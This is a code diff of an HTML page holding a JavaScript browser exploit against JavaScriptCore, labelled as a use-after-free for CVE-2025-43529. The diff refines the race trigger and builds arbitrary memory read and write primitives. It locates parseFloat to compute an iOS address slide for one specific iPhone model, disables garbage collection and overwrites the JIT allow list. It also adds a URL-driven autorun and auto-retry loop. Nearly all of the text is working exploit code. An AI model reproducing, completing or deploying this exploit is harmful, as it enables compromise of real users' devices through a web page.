@@ -125,6 +125,8 @@
     <div id="output-list"></div>
     <script>
         p = {};
+        var globalFuncParseFloat = 0n;
+        var slide = 0n;
         var p_rce = {
             _root: []
         };
@@ -373,6 +375,13 @@
                 (p & 0x7n) === 0n;
         }
 
+        function plausibleCodePointer(p) {
+            return typeof p === "bigint" &&
+                p >= 0x180000000n &&
+                p < 0x300000000n &&
+                (p & 0x3n) === 0n;
+        }
+
         function buildDSScribblePrimitives(addrof, fakeobj) {
             const report = {
                 ok: false,
@@ -387,6 +396,7 @@
             };
 
             let read64;
+            let read32;
             let write64;
             const keepAlive = [];
             const read64BigUint64 = new BigUint64Array(4);
@@ -419,20 +429,8 @@
 
             try {
                 report.stage = "build-change-scribble";
-                p.addrof = function addrof(o) {
-                    boxedArray[0] = obj;
-                    return ftoi(unboxedArray[0]);
-                }
-                p.fakeobj = function fakeobj(addr) {
-                    unboxedArray[0] = itof(addr);
-                    return boxedArray[0];
-                }
-                write16 = function (ptr, u16) {
-                    let value = read64(ptr);
-                    value &= ~0xffffn;
-                    value |= u16;
-                    write64(ptr, value);
-                };
+                p.addrof = addrof;
+                p.fakeobj = fakeobj;
 
                 // Do not log or touch this fake object. It is a placeholder JSValue,
                 // immediately replaced after harvesting a valid DoubleArray cell.
@@ -479,32 +477,6 @@
                     write64(offAddr, offVal);
                 }
             };
-            write64 = function (addr, value) {
-                addr = BigInt.asUintN(64, addr);
-                value = BigInt.asUintN(64, value);
-
-                changeScribble[0] = originalCell;
-                changeScribble[1] = itof(addr + 0x10n);
-
-                if (value === 0n) {
-                    scribbleElement.p3 = 1;
-                    delete scribbleElement.p3;
-                } else if (value < 0x2000000000000n) {
-                    scribbleElement.p3 = fakeobj(value);
-                } else if (value <= 0x7ff2000000000000n ||
-                    (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
-                    scribbleElement.p3 = itof(value - 0x2000000000000n);
-                } else {
-                    const offAddr = addr + 8n;
-                    const offVal = read64(offAddr);
-                    const lo = signed32(value);
-                    const hi = signed32(value >> 32n);
-                    scribbleElement.p3 = lo;
-                    changeScribble[1] = itof(addr + 0x14n);
-                    scribbleElement.p3 = hi;
-                    write64(offAddr, offVal);
-                }
-            };
 
 
             try {
@@ -525,47 +497,70 @@
                         (BigInt(read64Str.charCodeAt(3)) << 48n);
                 };
 
-                function read32(addr) {
-                    read64BigUint64[1] = addr;
-                    return (BigInt(read64_str.charCodeAt(0))
-                        | BigInt(read64_str.charCodeAt(1)) << 16n);
-                }
+                read32 = function (addr) {
+                    read64BigUint64[1] = BigInt.asUintN(64, addr);
+                    return BigInt(read64Str.charCodeAt(0)) |
+                        (BigInt(read64Str.charCodeAt(1)) << 16n);
+                };
             } catch (e) {
                 report.reason = `read64 setup failed: ${e.message}`;
                 return { ok: false, report };
             }
-            try {
-                this.read32 = read32;
-                this.read64 = read64;
-                this.write64 = write64;
-                const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
-                const heap = vm + 0xc0n;
-                const isSafeToCollect = heap + 0x241n;
-                write64(isSafeToCollect, 0n);
-                log("getting executable!");
-                //THIS PART CRASHES, WE NEED IT TO GET THE CORRECT SLIDE SLIDE 
-                const executable = read64(addrof(parseFloat) + 0x18n);
-                log("executable:" + executable);
-                //test debug 
-                return;
-                globalFuncParseFloat = read64(executable + 0x28n).noPAC();
-                const jsc_base = (function () {
-                    let jsc_base = globalFuncParseFloat & ~0xfffn;
 
-                    while (1) {
-                        read64_biguint64arr[1] = jsc_base;
-                        if (read64_str.charCodeAt(0) == 0xfacf && read64_str.charCodeAt(1) == 0xfeed) {
-                            return jsc_base;
-                        }
-                        jsc_base -= 0x1000n;
-                    }
-                })();
-                print("jsc_base: " + jsc_base.hex());
-                return;
-            }   catch (e) {
-                report.reason = `read64 setup failed: ${e.message}`;
-                return { ok: false, report };
+            p.read32 = read32;
+            p.read64 = read64;
+            p.write64 = write64;
+
+            let parseFloatCell = 0n;
+            let parseFloatResolution = null;
+
+            function captureParseFloatCellNow() {
+                report.stage = "capture-parseFloat-cell";
+                const parseFloatRef = globalThis.parseFloat;
+                keepAlive.push(parseFloatRef);
+                const raw = addrof(parseFloatRef);
+                const stripped = plausiblePointer(raw) ? raw : noPAC(raw);
+                log("parseFloat cell raw: " + hex(raw));
+                if (!plausiblePointer(stripped)) {
+                    report.reason = `bad addrof(parseFloat): ${hex(raw)}`;
+                    return 0n;
+                }
+                return stripped;
             }
+
+            function resolveParseFloatExecutableFromCell() {
+                report.stage = "resolve-parseFloat";
+                const executableFieldCandidates = [0x18n, 0x20n, 0x10n, 0x28n];
+                const codeFieldCandidates = [0x28n, 0x20n, 0x30n, 0x38n];
+
+                for (const executableField of executableFieldCandidates) {
+                    const executableRaw = read64(parseFloatCell + executableField);
+                    const executable = noPAC(executableRaw);
+                    log(`parseFloat executable field ${hex(executableField)} raw=${hex(executableRaw)} stripped=${hex(executable)}`);
+                    if (!plausiblePointer(executable)) continue;
+
+                    for (const codeField of codeFieldCandidates) {
+                        const codeRaw = read64(executable + codeField);
+                        const code = noPAC(codeRaw);
+                        log(`parseFloat code field ${hex(codeField)} raw=${hex(codeRaw)} stripped=${hex(code)}`);
+                        if (plausibleCodePointer(code)) {
+                            return { executableField, codeField, executableRaw, executable, codeRaw, code };
+                        }
+                    }
+                }
+
+                report.reason = "could not resolve parseFloat executable/code pointer";
+                return null;
+            }
+
+            try {
+                parseFloatCell = captureParseFloatCellNow();
+                if (!parseFloatCell) return { ok: false, report, read64, read32, write64 };
+            } catch (e) {
+                report.reason = `parseFloat cell capture failed: ${e.message}`;
+                return { ok: false, report, read64, read32, write64 };
+            }
+
             try {
                 report.stage = "prove-typed-array-backing-store";
                 const proofKeepAlive = [];
@@ -662,51 +657,65 @@
                 report.backingPtr = primaryProof.backingPtr;
                 report.secondaryBackingPtr = secondaryProof.backingPtr;
                 report.proofs = 2;
-                ///This needs to be done asap, any delay causes major issues 
+
+                parseFloatResolution = resolveParseFloatExecutableFromCell();
+                if (!parseFloatResolution) return { ok: false, report, read64, read32, write64 };
+                globalFuncParseFloat = parseFloatResolution.code;
+                log(`parseFloat executable resolved via obj+${hex(parseFloatResolution.executableField)} code+${hex(parseFloatResolution.codeField)}`, "ok");
+                log("globalFuncParseFloat: " + hex(globalFuncParseFloat));
+
+                // Disable Worklet GC. Keep this byte-granular: the field is at an
+                // unaligned +0x241 offset, and an 8-byte zero corrupts adjacent Heap data.
                 const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
-                log("vm:" + vm);
+                log("vm:" + hex(vm));
                 const heap = vm + 0xc0n;
-                log("heap:" + heap);
+                log("heap:" + hex(heap));
                 const isSafeToCollect = heap + 0x241n;
-                function write8(ptr, u16) {
+                function write8(ptr, u8Value) {
                     let value = read64(ptr);
                     value &= ~0xffn;
-                    value |= u16;
+                    value |= BigInt.asUintN(8, u8Value);
                     write64(ptr, value);
-                };
+                }
                 write8(isSafeToCollect, 0n);
-                log("GC disabled", "ok")
-                const executable = read64(addrof(parseFloat) + 0x18n);
-                globalFuncParseFloat = read64(executable + 0x28n).noPAC();
-                const jsc_base = (function () {
-                    let jsc_base = globalFuncParseFloat & ~0xfffn;
+                log("GC disabled", "ok");
 
-                    while (1) {
-                        read64BigUint64[1] = jsc_base;
-                        if (read64_str.charCodeAt(0) == 0xfacf && read64_str.charCodeAt(1) == 0xfeed) {
-                            return jsc_base;
-                        }
-                        jsc_base -= 0x1000n;
-                    }
-                })();
-            print("jsc_base now: " + hex(jsc_base));
-            slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
-            log(`iPhone 15 plus iOS 26.1 slide: ${hex(slide)}`);
-                //log(`iPhone 15 plus iOS 26.1 slide: ${hex(slide)}`);
-            //  log("I believe the side calculation is probably maybe correct");
-            for (const key of Object.keys(offsets)) {
-              if (offsets[key] >= 0x100000000n) offsets[key] += slide;
-             }
+                if (!parseFloatResolution) {
+                    report.reason = "parseFloat resolution missing after DS proof";
+                    return { ok: false, report, read64, read32, write64 };
+                }
+                slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
+                log(`iPhone 15 plus iOS 26.1 slide: ${hex(slide)}`);
+
+                for (const key of Object.keys(offsets)) {
+                    if (offsets[key] >= 0x100000000n) offsets[key] += slide;
+                }
+
                 log("[HERE BE DRAGONS] this code depends on iPhone 15 plus 26.1 offsets:", "warn");
-                //BUG: returns 0 on first read? 
                 log("[modify JitAllowList]: writing..");
                 write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
                 write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
-                log("[modify JitAllowList]: reading..")
-                log("JSC__jitAllowList_once:" + read64(offsets.JavaScriptCore__jitAllowList_once));
-                //log("JSC__jitAllowList: " + read64(offsets.JavaScriptCore__jitAllowList));
+                log("[modify JitAllowList]: reading..");
+                log("JSC__jitAllowList_once:" + hex(read64(offsets.JavaScriptCore__jitAllowList_once)));
                 log("[modify JitAllowList] modified!");
-                return
+
+                return {
+                    ok: true,
+                    report,
+                    read64,
+                    read32,
+                    write64,
+                    keepAlive: {
+                        keepAlive,
+                        read64BigUint64,
+                        read64Str,
+                        scribbleElement,
+                        changeScribbleHolder,
+                        changeScribble,
+                        proofKeepAlive
+                    }
+                };
+
                 //start PAC bypass nonsense 
                 // async function loadObjcClass(cls) {
                 //      const bitmap = await createImageBitmap(canvas);
@@ -759,6 +768,7 @@
                     ok: true,
                     report,
                     read64,
+                    read32,
                     write64,
                     keepAlive: {
                         keepAlive,
@@ -786,9 +796,11 @@
 
             log("Stage 1: CVE-2025-43529 UAF trigger");
 
+            log("Stage 1a: allocating root array", "warn");
             const rootArray = new Array(0x40_0000).fill(1.1);
             const rootIndex = rootArray.length - 1;
             const reclaimed = [];
+            log(`Stage 1a done: root length=${rootArray.length}`, "warn");
 
             function triggerUAF(flag, k, allocCount) {
                 const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
@@ -831,21 +843,37 @@
                 try { recursive(n); } catch (e) { }
             }
 
+
+            log("Stage 1b: warmup trigger true", "warn");
             triggerUAF(true, 1, 1);
+            log("Stage 1c: warmup trigger false", "warn");
             triggerUAF(false, 1, 1);
 
+            log("Stage 1d: training triggerUAF(false,0,0) x1000", "warn");
             for (let i = 0; i < 1000; ++i) {
                 triggerUAF(false, 0, 0);
             }
 
+            log("Stage 1d done", "warn");
+
+            log("Stage 1e: recursive warmup x20", "warn");
             for (let i = 0; i < 20; ++i) {
                 safeRecursive(800);
             }
+            log("Stage 1e done; entering race loop", "warn");
 
             let success = false;
             let lastProgress = Date.now();
+            const params = new URLSearchParams(location.search);
+            const quietRace = params.get("quietRace") === "1";
+            const maxRace = Math.max(1, parseInt(params.get("maxRace") || "32", 10));
+            const autorunRetry = params.get("autorun") === "1" && params.get("autoRetry") !== "0";
+            const round = Math.max(0, parseInt(params.get("round") || "0", 10));
+            const maxRounds = Math.max(0, parseInt(params.get("maxRounds") || "60", 10));
+            const retryDelay = Math.max(0, parseInt(params.get("retryDelay") || "2500", 10));
 
-            for (let k = 0; k < 15000; ++k) {
+            for (let k = 0; k < maxRace; ++k) {
+                if (!quietRace && (k % 250) === 0) log(`race loop k=${k}`, "warn");
                 triggerUAF(false, 10, (k % 5) + 1);
                 safeRecursive(800);
 
@@ -875,8 +903,10 @@
 
                 if (!winningArray) {
                     if ((Date.now() - lastProgress) > 1500) {
-                        log(`attempt ${k}/15000; reclaimed arrays=${reclaimed.length}`, "warn");
-                        setStatus(`racing ${k}/15000`);
+                        if (!quietRace) {
+                            log(`attempt ${k}/${maxRace}; reclaimed arrays=${reclaimed.length}`, "warn");
+                            setStatus(`racing ${k}/${maxRace}`);
+                        }
                         lastProgress = Date.now();
                         await new Promise(r => setTimeout(r, 1));
                     }
@@ -944,8 +974,19 @@
             }
 
             if (!success) {
-                log("Stage 1 failed: race not won after max attempts", "fail");
+                log(`Stage 1 batch failed: race not won after ${maxRace} attempts`, "fail");
                 setStatus("failed to win UAF race");
+
+                if (autorunRetry && round < maxRounds) {
+                    params.set("round", String(round + 1));
+                    params.set("t", String(Date.now()));
+                    const nextURL = `${location.pathname}?${params.toString()}`;
+                    const trampolineURL = `/retry.html?delay=${retryDelay}&next=${encodeURIComponent(nextURL)}`;
+                    log(`autorun retry ${round + 1}/${maxRounds}: ${nextURL}`, "warn");
+                    setStatus(`retrying batch ${round + 1}/${maxRounds}`);
+                    setTimeout(() => location.replace(trampolineURL), 100);
+                    return;
+                }
             }
 
             runner.disabled = false;
@@ -955,8 +996,17 @@
         window.addEventListener("load", () => {
             setStatus("ready");
             log("Ready; press Run now to start the primitive test", "warn");
-            //get slide
-            var globalFuncParseFloat = 0n;
+            // slide is derived after DS read/write verification.
+            if (new URLSearchParams(location.search).get("autorun") === "1") {
+                const autorunKey = "pois0nSword.autorun." + location.pathname + location.search;
+                if (sessionStorage.getItem(autorunKey) === "done") {
+                    log("autorun=1 but this URL already ran once; not re-running after reload", "warn");
+                } else {
+                    sessionStorage.setItem(autorunKey, "done");
+                    log("autorun=1; starting automatically", "warn");
+                    setTimeout(() => init(), 250);
+                }
+            }
         });
     </script>
 </body>
